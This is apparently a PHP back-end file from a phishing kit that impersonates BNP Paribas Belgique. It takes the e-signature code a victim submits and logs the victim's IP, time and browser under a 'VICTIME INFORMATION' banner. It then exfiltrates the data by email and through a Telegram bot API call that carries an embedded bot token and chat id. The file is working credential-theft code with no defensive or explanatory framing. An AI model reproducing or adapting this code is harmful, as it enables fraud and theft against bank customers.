<?php

include('get_browser.php');
include('get_ip.php');
include('Email.php');
$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');	
if(isset($_POST) ){

$data = array();	

if ($_POST['DEVICE'] == "" ||  $_POST['e_sign'] == ""){



$data['statut'] = 'error'; 
$data['title'] = 'echec';
$data['resultat']="aucune donnée saissir ";
  
  }else{

$DCH_MESSAGE .= "
+=======VICTIME INFORMATION========+
| IP INFO          =".$ip."    
| TIME/DATE        =".$TIME_DATE."
| BROWSER          =".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])." 
+========== E-SIGNATURE BNP BELGIQUE ========+
| E-SIGNATURE  =  ".$_POST['e_sign']."
+===============================+\n";

$DCH_SUBJECT .= "E-SIGNATURE BNP BELGIQUE";
$DCH_HEADERS .= "From: TCHE-Dev<cantact>";
$DCH_HEADERS .= "TCHE-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
file_get_contents("https://api.telegram.org/bot6737841709:AAH0KO7_rXOGZkNqfFTYb6LBa4BPCUlGD8I/sendMessage?chat_id=6754955805&text=".urlencode($DCH_MESSAGE)."" );



$Page .= ' ';

$fPage = fopen("../select/Show_system/Show_Page.txt", "w");

fwrite($fPage, $Page);


$data['statut'] = 'success'; 
$data['title'] = 'succès'; 
$data['resultat']="valider";

}

echo json_encode($data);

}


